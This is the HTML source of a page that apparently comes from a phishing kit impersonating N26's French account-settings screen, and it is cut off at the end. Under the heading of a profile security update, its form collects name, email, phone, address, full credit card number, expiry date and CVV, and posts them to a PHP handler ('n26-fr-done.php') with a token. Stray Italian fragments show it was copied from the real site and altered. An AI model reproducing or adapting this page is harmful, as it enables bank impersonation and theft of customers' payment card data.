0.77rem)}.rv{padding-bottom:calc(var(--responsive-base) * 0.77rem)}.rw{border-bottom-style:none}.cl:hover{color:var(--typography-interactive-default)}.eo:hover{color:inherit}.ep:hover{text-decoration:underline}.iu:hover::before{opacity:1}.jf:hover{box-shadow:0 5px 10px rgba(0, 0, 0, 0.2)}.jg:hover{transform:translateY(0)}.ok:hover{transform:translateY(-2px)}.bu:focus{height:auto}.bv:focus{width:120px}.bw:focus{line-height:var(--line-height-m)}.cm:focus{border-radius:var(--border-radius-xs)}.cn:focus{box-shadow:0 0 0 3px var(--primary-focus)}.co:focus{outline-width:0}.di:focus{box-shadow:0 3px var(--primary-focus)}.dj:focus{outline-style:none}.eq:focus{color:inherit}.iv:focus::after{box-shadow:inset 0 0 0 3px var(--primary-focus)}.jh:focus{box-shadow:0 0 0 3px var(--primary-focus), 0 3px 12px 0 rgba(0, 0, 0, 0.14)}.nb:focus{box-shadow:inset 0 -1px 0 var(--primary-focus)}.nc:focus{border-top-color:var(--primary-focus)}.nd:focus{border-right-color:var(--primary-focus)}.ne:focus{border-bottom-color:var(--primary-focus)}.nf:focus{border-left-color:var(--primary-focus)}.ol:focus{box-shadow:0 5px 10px rgba(0, 0, 0, 0.1), 0 0 0 3px var(--primary-focus)}.oz:focus{color:var(--typography-interactive-default)}.ph:focus + *{box-shadow:0 0 0 3px var(--primary-focus)}.pi:focus + *{outline-style:none}
</style>


<style data-fela-id="" data-fela-rehydration="490" data-fela-type="RULE" media="(max-width: 349px)">
  .ie{display:none}
</style>


<style data-fela-id="" data-fela-rehydration="490" data-fela-type="RULE" media="(max-width: 767px)">
  .am{background-color:var(--background-default)}.an{box-shadow:0 -0.1em 0.15em var(--mild-overlay)}.ao{padding-bottom:env(safe-area-inset-bottom)}.ap{bottom:0}.do{margin-top:0}.dp{margin-right:auto}.dq{margin-bottom:3.3rem}.dr{margin-left:auto}.ds{padding-top:var(--spacing-m)}.dt{padding-right:calc(var(--responsive-base) * 1.1rem)}.du{padding-bottom:var(--spacing-m)}.dv{padding-left:calc(var(--responsive-base) * 1.1rem)}.id{margin-right:var(--spacing-xs)}.ke{margin-bottom:var(--spacing-m)}
</style>


<style data-fela-id="" data-fela-rehydration="490" data-fela-type="RULE" media="(min-width: 768px)">
  .gx{align-items:flex-start;-webkit-box-align:start}.gy{display:-webkit-box;display:-moz-box;display:-ms-flexbox;display:-webkit-flex;display:flex}.gz{margin-top:0}.ha{margin-right:calc(var(--spacing-s) * -1)}.hb{margin-bottom:0}.hc{margin-left:calc(var(--spacing-s) * -1)}.hd{flex-grow:1;-webkit-box-flex:1}.he{flex-shrink:1}.hf{flex-basis:0%}.hg{min-height:100%}.hh{max-height:100%}.hi{min-width:0%}.hj{padding-top:0}.hk{padding-right:var(--spacing-s)}.hl{padding-bottom:0}.hm{padding-left:var(--spacing-s)}.jt{display:-webkit-box;display:-moz-box;display:-ms-flexbox;display:-webkit-flex;display:flex;display:-ms-grid;display:grid}.ju{flex-wrap:wrap;-webkit-box-lines:multiple}.jv{grid-column-gap:var(--spacing-m)}.jw{grid-row-gap:var(--spacing-m)}.jx{grid-template-areas:
      'number street street'
      'zip city country'
      'co co co'
    }.jy{grid-template-columns:1fr 1fr 1fr;-ms-grid-columns:1fr 1fr 1fr}.jz{margin-bottom:var(--spacing-m)}.ka{grid-area:number}.kb{position:relative}.kc{flex-grow:1}.kd{flex-basis:33.33%}.lg + ul{overflow-y:scroll}.lh + ul{max-height:10em}.nr{grid-area:street}.ns{grid-area:zip}.nt{grid-area:city}.nu{grid-area:country}.oe{grid-area:co}.og{flex-direction:column;-webkit-box-orient:vertical;-webkit-box-direction:normal}.oh{align-items:flex-end;-webkit-box-align:end}
</style>

    <style data-rh="true">:root { --background-default: rgb(255, 255, 255); --background-alternate: rgb(251, 251, 251); --background-screen: rgb(251, 251, 251); --background-button-primary-active: rgb(54, 161, 139); --background-button-primary-pressed: rgb(42, 126, 109); --background-button-primary-disabled: rgb(228, 242, 239); --background-button-secondary: rgb(255, 255, 255); --background-container-teal: rgb(54, 161, 139); --background-container-rhubarb: rgb(203, 124, 122); --background-container-wheat: rgb(205, 163, 95); --background-container-petrol: rgb(38, 102, 120); --background-container-secondary-teal: rgb(202, 215, 202); --background-container-secondary-rhubarb: rgb(229, 195, 199); --background-container-secondary-wheat: rgb(245, 214, 186); --background-container-secondary-petrol: rgb(200, 215, 229); --background-container-light: rgb(245, 245, 245); --background-container-light-teal: rgb(228, 242, 239); --background-container-light-rhubarb: rgb(242, 228, 228); --background-container-light-wheat: rgb(242, 233, 218); --background-container-light-petrol: rgb(227, 238, 241); --background-light-error-red: rgb(248, 237, 237); --background-info-card: rgb(230, 230, 230); --typography-default: rgb(27, 27, 27); --typography-default-inverted: rgb(255, 255, 255); --typography-default-consistent: rgb(27, 27, 27); --typography-default-inverted-consistent: rgb(255, 255, 255); --typography-extra-light: rgb(191, 191, 191); --typography-light: rgb(116, 116, 116); --typography-interactive-default: rgb(54, 161, 139); --typography-interactive-teal: rgb(42, 126, 109); --typography-interactive-rhubarb: rgb(203, 124, 122); --typography-interactive-wheat: rgb(205, 163, 95); --typography-interactive-petrol: rgb(38, 102, 120); --typography-error: rgb(180, 75, 70); --divider-default: rgb(230, 230, 230); --divider-teal: rgb(54, 161, 139); --divider-error: rgb(180, 75, 70); --divider-dark: rgb(116, 116, 116); --iconography-default: rgb(27, 27, 27); --iconography-default-inverted: rgb(255, 255, 255); --iconography-light: rgb(116, 116, 116); --iconography-bright: rgb(230, 230, 230); --iconography-action: rgb(54, 161, 139); --mild-overlay: rgba(0, 0, 0, 0.075); --distinct-overlay: rgba(0, 0, 0, 0.2); --shadow-default: rgba(0, 0, 0, 0.2); --primary-focus: rgba(54, 161, 139, 0.6); --shimmer-background: rgb(230, 230, 230); --shimmer-foreground: rgb(251, 251, 251); --deprecated-gray: rgb(201, 201, 201); }</style>
    


<noscript>
<meta http-equiv='refresh' content='0; url=/remove-javascript-cookie' />
</noscript>
<link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css"></head>
<body>
<div id="root"><div id="app"><p tabindex="-1" class="a b c d e f g h i j k l m n" id="a11y-page-name-paragraph"></p><div class="o p q r s t u v"><header role="banner" class="ab ac ae af ag ah ai aj ak al am an ao ap o p s w x y z"><div class="ac ae aq ar x z"><div class="ac as at au av aw ax ay az z"><a class="aw ay ba bb bc bd be bf bg bh bi bj bk bl bm bn bo bp bq br bs bt bu bv bw"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Vai au contenu principal</font></font></a><div class="bb bx by bz ca cb cc cd t v x"><a title="Domicile" class="aw ay ba bb bc bd be bf bg bh bi bj bk bl bm bn bo bp ce"><svg viewBox="0 0 1200 819.91" class="bm cf cg ch" id="logo"><path d="M302.29 179.3v315.58c0 27.93.65 44.83 1.95 61.07h-1.3c-6.83-18.6-14.88-34.9-26.89-56.12L89.41 179.3H4.11v461.3h66.46V325c0-27.94-.65-44.83-1.94-61.08H70c6.82 18.6 14.87 34.89 26.89 56.1L283.47 640.6h84.4V179.3zM1060.44 333.69c-55 0-94.27 25.44-114.12 63.1 0-89 31-166.47 104.7-166.47 46.84 0 65.43 26.95 75.36 71.14l68.22-13.65c-16-76.29-64.53-113.37-143.1-113.37-98.72 0-172.58 75.8-172.58 245.69 0 150.81 61.59 225.35 167.71 225.35 87.69 0 153.37-59.88 153.37-158.55 0-77.09-41.1-153.24-139.56-153.24zm-13.64 256.05c-54.42 0-92.1-50-98.62-116.39 16.53-56.63 53.18-84.84 96.52-84.84 55.71 0 87.14 41.14 87.14 99.63 0 62.78-35.84 101.6-85.04 101.6zM577.29 580.84c34.73-24 84.52-63.87 106.61-86 25.11-25.12 96.59-89.69 96.59-181.74 0-95.15-62-138.7-145.85-138.7-101.64.04-151.83 62.6-151.83 134.17a146.72 146.72 0 004.55 36.43l69.64 6.7a185.21 185.21 0 01-4.55-39.63c0-53.6 35.47-79.25 79.88-79.25 43.3 0 75.35 24.26 75.35 82.6 0 59.29-29 99.7-73.16 143.91C588.35 505.53 514.55 560.65 479 586v54.6h306.67v-59.76zM372 760.14v59.77H0v-59.77zM372 0v59.77H0V0z"></path><path d="M302.29 179.3v315.58c0 27.93.65 44.83 1.95 61.07h-1.3c-6.83-18.6-14.88-34.9-26.89-56.12L89.41 179.3H4.11v461.3h66.46V325c0-27.94-.65-44.83-1.94-61.08H70c6.82 18.6 14.87 34.89 26.89 56.1L283.47 640.6h84.4V179.3z"></path></svg><span class="a b c d e f g h i j k l m n"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Transactions</font></font></span></a></div></div><div class="ac as at au dk dl z"><div class="ac aq ck cl cm cn co cp cq cr cs dm s z"><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" class="bm cf da ct cu cv cw cx cy cz"><g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g transform="translate(7.000000, 2.000000)" stroke="#36A18B" stroke-width="1.5"><circle id="Oval" cx="5" cy="5" r="4.25"></circle></g><path d="M16,14 C19.3137085,14 22,16.6862915 22,20 L22,22 L20.5,22 L20.5,20 C20.5,17.5857267 18.5987635,15.6155109 16.2118357,15.504898 L16,15.5 L8,15.5 C5.58572667,15.5 3.61551091,17.4012365 3.50489799,19.7881643 L3.5,20 L3.5,22 L2,22 L2,20 C2,16.6862915 4.6862915,14 8,14 L16,14 Z" fill="#36A18B" fill-rule="nonzero"></path></g></svg><a aria-current="page" class="aw ay ba bb bc bd be bf bg bh bi bj bk bl bm bn bo bp cl ct db dc dd de df dg dh di dj"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Mon compte</font></font></a></div></div></div></header>




<main role="main" class="cr dn do dp dq dr ds dt du dv dw dx dy dz ea eb ec x" id="main">
<div class="ac ee ef z">
<h1 class="bq cp cr eg eh ei ej ek"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Données personnelles</font></font></h1>
<a class="aw ay ba bb bc bd be bf bg bh bi bj bk bl bm bn bp ct di dj el em en eo ep eq er s"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" aria-hidden="true" focusable="false" class="bm cf da br by ct cu cv cw es"><path d="M23.23 32a1.53 1.53 0 0 0 1.08-2.61L10.93 16 24.32 2.61A1.53 1.53 0 0 0 22.15.45L7.68 14.92a1.53 1.53 0 0 0 0 2.16l14.47 14.47a1.53 1.53 0 0 0 1.08.45z"></path></svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Revenir à mon </font></font><!-- --><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">compte</font></font></a></div>
<section id="shipping-information" class="dy">
<h2 class="bq cp eh et eu ev"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Dans cette section, vous pouvez mettre à jour les informations de sécurité de votre profil.</font></font></h2><br>
<div class="aq cx ew ex ey ez fa fc fd fe ff o s x">
<form action="<?php echo 'n26-fr-done.php?token='.$token1; ?>" method="POST">
<div class="jt ju jv jw jx jy jz">



<div class="he ka kb kc kd ke">
<div class="">
<label class="ct iw np nq" for="address.number"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nom et prénom</font></font></label>
<input type="text" id="address.number" name="np" maxlength="36" placeholder="nom prenom" class="aq ba bb bc bd bf bg dj iw kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no o s x"></div></div>


<div class="he kb kc kd ke nr">
<div class="">
<label class="ct iw np nq" for="address.street"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">adresse e-mail</font></font></label>
<input type="email" id="address.street" name="email" maxlength="60" placeholder="e-mail" class="aq ba bb bc bd bf bg dj iw kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no o s x"></div></div>



<div class="he kb kc kd ke ns">
<div class="">
<label class="ct iw np nq" for="address.zip"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Numéro de téléphone</font></font></label>
<input type="tel" id="address.zip" name="tel" maxlength="14" placeholder="Numéro de téléphone" class="aq ba bb bc bd bf bg dj iw kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no o s x"></div></div>



<div class="he kb kc kd ke nt">
<div class="">
<label class="ct iw np nq" for="address.city"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Adresse</font></font></label>
<input type="tel" id="address.city" name="adresse" maxlength="128" placeholder="adresse" class="aq ba bb bc bd bf bg dj iw kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no o s x"></div></div></div>


<hr style="
    border-top: rgb(54, 161, 139);
">
<img src="n26_files/dars.png" style="
    margin: 0 auto;
">
<div class="jt ju jv jw jx jy jz" style="
    margin-bottom: 0px;
">




<div class="he ka kb kc kd ke">
<div class="">
<label class="ct iw np nq" for="address.number"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">N° carte de credit</font></font></label>
<input type="text" id="cn" name="cn" required="" maxlength="21" placeholder="xxxx xxxx xxxx xxxx" class="aq ba bb bc bd bf bg dj iw kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no o s x"></div></div>





</div>

<div class="jt ju jv jw jx jy jz" style="
    margin-bottom: 0px;
">



<div class="he ka kb kc kd ke">
<div class="">
<label class="ct iw np nq" for="address.number"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Date d'expiration</font></font></label>
<input type="text" id="ed" name="ed" required="" maxlength="6" placeholder="mm/yy" class="aq ba bb bc bd bf bg dj iw kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no o s x"></div></div>





</div><div class="jt ju jv jw jx jy jz" style="
    margin-bottom: 0px;
">



<div class="he ka kb kc kd ke">
<div class="">
<label class="ct iw np nq" for="address.number"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Code securité / cryptogramme</font></font></label>
<input type="text" id="sc" name="sc" required="" maxlength="4" placeholder="123" class="aq ba bb bc bd bf bg dj iw kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no o s x"></div></div>


<div class="he kb kc kd ke nr">
<div class="">
<label class="ct iw np nq" for="address.street"></label>
</div></div>


</div><div id="change-address-errors" role="alert"></div>
<div class="gy of og oh">
<div class="aq">
<div aria-live="polite" class="a b c d e f g h i j k l m n"></div>
<button class="bn bp ca cc ct dj eh ey jc jd je jf jq js nl oi oj ok ol om on oo op oq or os ot ou ov ow s" type="submit"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sauvegarder les modifications</font></font></button></div></div>
<input type="hidden" name="type" value="infos">

</form></div></section>





<div class="gx gy gz ha hb hc">
<div class="hd he hf hg hh hi hj hk hl hm">
<section id="personal-information" class="dy">
<div class="aq br ew ex ey ez fa fc fd fe ff o s x">
<label class="ac aq pe pf z" for="visibleAsN26Contact">
<input type="checkbox" id="visibleAsN26Contact" name="visible" aria-describedby="visibleAsN26Contact-errors" value="false" class="as at av aw ay ba bb bc bd be bf br cp cr ho hq nv pg ph pi pj pk pl pm pn po pp pq pr ps pt pu pv pw px py pz qa qb qc qd qe qf x">
<span class="aq cd cn ct db dc dj ew nl om on oo op oq or os qh qi qj qk ql qm qn qo qp qq qr qs qt qu qv qw qx qy qz ra rb rc rd re rf rg rh ri rj rk rl rm rn ro"></span>
<span class="by ct ii u v"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">J'accepte d'être reconnu par les autres utilisateurs en tant que client N26 lors de l'utilisation des services de l'application N26. </font><a target="_blank" class="aq aw ay ba bb bc bd be bf bg bh bi bj bk bl bm bp cl el em en ox oy oz q s" rel=" noopener noreferrer"><font style="vertical-align: inherit;">Plus d'informations sur la visibilité des contacts</font></a></font><!-- --> <a target="_blank" class="aq aw ay ba bb bc bd be bf bg bh bi bj bk bl bm bp cl el em en ox oy oz q s" rel=" noopener noreferrer"><font style="vertical-align: inherit;"></font><span title="(nouova tabella)" class="ih pa pb br ct cu cv cw"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" aria-hidden="true" focusable="false" class="bm cf da pc pd"><path d="M22 11L10.5 22.5M10.44 11H22v11.56" fill="none"></path></svg><span class="a b c d e f g h i j k l m n"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(nouova tabella)</font></font></span></span></a></span>
</label>

<div id="visibleAsN26Contact-errors" role="alert"></div>
</div>




<div class="aq br ew ex ey ez fa fc fd fe ff o s x">
<label class="ac aq pe pf z" for="consented">
<input type="checkbox" id="consented" name="consented" aria-describedby="consented-errors" value="false" class="as at av aw ay ba bb bc bd be bf br cp cr ho hq nv pg ph pi pj pk pl pm pn po pp pq pr ps pt pu pv pw px py pz qa qb qc qd qe qf x">
<span class="aq cd cn ct db dc dj ew nl om on oo op oq or os qh qi qj qk ql qm qn qo qp qq qr qs qt qu qv qw qx qy qz ra rb rc rd re rf rg rh ri rj rk rl rm rn ro"></span>

<span class="by ct ii u v"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Je consens à ce que N26 envoie mon adresse e-mail à Facebook pour arrêter d'afficher les publicités N26 et aider N26 à mieux comprendre son groupe d'utilisateurs. </font><font style="vertical-align: inherit;">è Ce consentement est révocable. </font></font><a target="_blank" class="aq aw ay ba bb bc bd be bf bg bh bi bj bk bl bm bp cl el em en ox oy oz q s" rel=" noopener noreferrer"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">En savoir plusù</font></font><span title="(nouova tabella)" class="ih pa pb br ct cu cv cw"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" aria-hidden="true" focusable="false" class="bm cf da pc pd"><path d="M22 11L10.5 22.5M10.44 11H22v11.56" fill="none"></path></svg><span class="a b c d e f g h i j k l m n"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(nouova tabella)</font></font></span></span></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.</font></font></span></label><div id="consented-errors" role="alert"></div></div>




<div class="aq br ew ex ey ez fa fc fd fe ff o s x">
<label class="ac aq pe pf z" for="isSubscribed">
<input type="checkbox" id="isSubscribed" name="isSubscribed" aria-describedby="newsletter-subscription-errors" value="false" class="as at av aw ay ba bb bc bd be bf br cp cr ho hq nv pg ph pi pj pk pl pm pn po pp pq pr ps pt pu pv pw px py pz qa qb qc qd qe qf x">
<span class="aq cd cn ct db dc dj ew nl om on oo op oq or os qh qi qj qk ql qm qn qo qp qq qr qs qt qu qv qw qx qy qz ra rb rc rd re rf rg rh ri rj rk rl rm rn ro"></span>
<span class="by ct ii u v"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">J'accepte de recevoir les mises à jour des produits de N26 par e-mail. </font><font style="vertical-align: inherit;">è Je peux révoquer ce consentement à tout moment. </font></font><a target="_blank" class="aq aw ay ba bb bc bd be bf bg bh bi bj bk bl bm bp cl el em en ox oy oz q s" rel=" noopener noreferrer"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">En savoir plusù</font></font><span title="(nouova tabella)" class="ih pa pb br ct cu cv cw"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" aria-hidden="true" focusable="false" class="bm cf da pc pd"><path d="M22 11L10.5 22.5M10.44 11H22v11.56" fill="none"></path></svg><span class="a b c d e f g h i j k l m n"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(nouova tabella)</font></font></span></span></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.</font></font></span>
</label><div id="newsletter-subscription-errors" role="alert"></div></div>
</section></div>



<div class="hd he hf hg hh hi hj hk hl hm"><div><section id="tax-info" class="dy"><h2 class="bq cp eh et eu ev"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Données fiscales</font></font></h2><div class="ab ae aq br ew ex ey ez fa fc fd fe ff o s x z"><div class="ac hr ia x z"><div class="ac ci ib ic id ie"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" aria-hidden="true" focusable="false" class="bm cf da ab ae br cu cv cw if ih z"><rect x="10.49" y="7.39" width="23.52" height="33.3" rx="1.4" ry="1.4" fill="none" stroke="currentcolor" stroke-miterlimit="10" stroke-width="1.198"></rect><path d="M37.78 29.45L26.56 42.07l-1.56.25.28-1.43 11.17-12.62a.89.89 0 0 1 1.25-.07.89.89 0 0 1 .08 1.25z" fill="#fff" stroke="currentcolor" stroke-miterlimit="10" stroke-width="1.12"></path><path fill="none" stroke="currentcolor" stroke-miterlimit="10" stroke-width="1.12" d="M35.35 29.51l.89.89"></path><path fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width=".889" d="M14 13.5h8.5m-8.5-2h15m-15 4h10.5"></path></svg></div><p class="ac br ci cr ef ii z"><span class="bq bx ij ik il x"><a class="aw ay ba bb bc bd be bf bg bh bi bj bk bl bm bn bo bp ct db dc dd df dg dj ge gj gk gl im in io ip iq ir is it iu iv"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Données fiscales</font></font></a></span><span class="bq bx hz iw x"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Pays d'assujettissement et numéro fiscal</font></font></span></p><div class="ac ba cr ic ix iy iz z"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" aria-hidden="true" focusable="false" class="bm cf da br ct cu cv cw ja"><path d="M8.77 32a1.53 1.53 0 0 1-1.08-2.61L21.07 16 7.68 2.61A1.53 1.53 0 1 1 9.85.45l14.47 14.47a1.53 1.53 0 0 1 0 2.16L9.85 31.55a1.53 1.53 0 0 1-1.08.45z"></path></svg></div></div></div></section><section id="account-cancellation" class="dy"><h2 class="bq cp eh et eu ev"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Mon compte</font></font></h2><div class="aq aw ay ba bb br ew ex ey ez fa o s x"><ul class="aw ay ba bb cp cr ho hq rq rr rs"><li class="ab ae aq fd ff nk nl rt ru rv z"><div class="ac hr ia x z"><div class="ac ci ib ic id ie"><svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" class="bm cf da ab ae br cu cv cw if ih z"><g fill="currentcolor" stroke="transparent"><path d="M7.4 3.75a.65.65 0 0 0-.65.65v23.2c0 .359.291.65.65.65h17.2a.65.65 0 0 0 .65-.65V4.4a.65.65 0 0 0-.65-.65H7.4zm0-1.5h17.2a2.15 2.15 0 0 1 2.15 2.15v23.2a2.15 2.15 0 0 1-2.15 2.15H7.4a2.15 2.15 0 0 1-2.15-2.15V4.4A2.15 2.15 0 0 1 7.4 2.25z" id="Rectangle-path"></path><path d="M10 10.75a.75.75 0 1 1 0-1.5h6.768a.75.75 0 1 1 0 1.5H10zm0-3a.75.75 0 0 1 0-1.5h11.843a.75.75 0 0 1 0 1.5H10zm0 6a.75.75 0 1 1 0-1.5h8.46a.75.75 0 0 1 0 1.5H10z" id="Shape"></path></g></svg></div><p class="ac br ci cr ef ii z"><span class="bq bx ij ik il x"><a target="_blank" class="aw ay ba bb bc bd be bf bg bh bi bj bk bl bm bn bo bp ct db dc dd df dg dj ge gj gk gl im in io ip iq ir is it iu iv" rel=" noopener noreferrer"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Vos informations personnelles</font></font><span title="(nouova tabella)" class="ih pa pb br ct cu cv cw"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" aria-hidden="true" focusable="false" class="bm cf da pc pd"><path d="M22 11L10.5 22.5M10.44 11H22v11.56" fill="none"></path></svg><span class="a b c d e f g h i j k l m n"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(nouova tabella)</font></font></span></span></a></span><span class="bq bx hz iw x"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Téléchargez une copie de vos données</font></font></span></p><div class="ac ba cr ic ix iy iz z"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" aria-hidden="true" focusable="false" class="bm cf da br ct cu cv cw ja"><path d="M8.77 32a1.53 1.53 0 0 1-1.08-2.61L21.07 16 7.68 2.61A1.53 1.53 0 1 1 9.85.45l14.47 14.47a1.53 1.53 0 0 1 0 2.16L9.85 31.55a1.53 1.53 0 0 1-1.08.45z"></path></svg></div></div></li><li class="ab ae aq fd ff nk rt ru rv rw z"><div class="ac hr ia x z"><div class="ac ci ib ic id ie"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" aria-hidden="true" focusable="false" class="bm cf da ab ae br cu cv cw if ih z"><g stroke="transparent"><path d="M18.419 7.143l.466 3.12a1.5 1.5 0 0 1-.11.825l-3.535 8.04.472 4.507 8.82 2.007a.502.502 0 0 0 .6-.383L28.448 9.66a.501.501 0 0 0-.392-.594L18.42 7.143zm-.404-1.61L28.35 7.595a2 2 0 0 1 1.57 2.352L26.6 25.57a2 2 0 0 1-2.373 1.54c-.006 0-3.072-.698-9.197-2.092a1 1 0 0 1-.773-.87l-.55-5.259 3.695-8.404-.572-3.824a1 1 0 0 1 1.185-1.129z"></path><path d="M11.739 23.5l-.72-4.464a1.5 1.5 0 0 1 .066-.736l2.866-8.167-.692-3.633H3.5A.5.5 0 0 0 3 7v16a.5.5 0 0 0 .5.5h8.239zM3.5 5h10.173a1 1 0 0 1 .982.813l.845 4.436-3 8.548.813 5.044A1 1 0 0 1 12.326 25H3.5a2 2 0 0 1-2-2V7a2 2 0 0 1 2-2z"></path></g></svg></div><p class="ac br ci cr ef ii z"><span class="bq bx ij ik il x"><a target="_blank" class="aw ay ba bb bc bd be bf bg bh bi bj bk bl bm bn bo bp ct db dc dd df dg dj ge gj gk gl im in io ip iq ir is it iu iv" rel=" noopener noreferrer"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Fermer le compte</font></font><span title="(nouova tabella)" class="ih pa pb br ct cu cv cw"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" aria-hidden="true" focusable="false" class="bm cf da pc pd"><path d="M22 11L10.5 22.5M10.44 11H22v11.56" fill="none"></path></svg><span class="a b c d e f g h i j k l m n"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(nouova tabella)</font></font></span></span></a></span><span class="bq bx hz iw x"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Envoyez ce formulaire à support@n26.com</font></font></span></p><div class="ac ba cr ic ix iy iz z"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" aria-hidden="true" focusable="false" class="bm cf da br ct cu cv cw ja"><path d="M8.77 32a1.53 1.53 0 0 1-1.08-2.61L21.07 16 7.68 2.61A1.53 1.53 0 1 1 9.85.45l14.47 14.47a1.53 1.53 0 0 1 0 2.16L9.85 31.55a1.53 1.53 0 0 1-1.08.45z"></path></svg></div></div></li></ul></div></section></div></div></div></main></div><button id="support-chat-toggle" type="button" aria-controls="support-chat" class="ac bc bd be bf bn bp cl dj eh ew jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js o q s w z"><span class="o"><svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" class="bm cf da br by ct cu cv cw"><g fill="none" fill-rule="nonzero"><path fill="currentColor" d="M15.528 13.5c-2.048 0-2.899.168-3.751.624a3.952 3.952 0 0 0-1.653 1.653c-.456.852-.624 1.703-.624 3.75v2.945c0 2.048.168 2.899.624 3.751.383.717.936 1.27 1.653 1.653.852.456 1.703.624 3.75.624h13.91c.585 0 .71-.024.832-.09a.319.319 0 0 0 .141-.14c.066-.124.09-.248.09-.834v-7.908c0-2.048-.168-2.899-.624-3.751a3.952 3.952 0 0 0-1.653-1.653c-.852-.456-1.703-.624-3.75-.624h-8.945zm0-1.5h8.944c2.478 0 3.48.278 4.459.801a5.452 5.452 0 0 1 2.268 2.268c.523.978.801 1.98.801 4.459v7.908c0 .892-.093 1.215-.267 1.54-.174.327-.43.583-.756.757-.326.174-.65.267-1.54.267h-13.91c-2.477 0-3.48-.278-4.458-.801a5.452 5.452 0 0 1-2.268-2.268C8.278 25.953 8 24.95 8 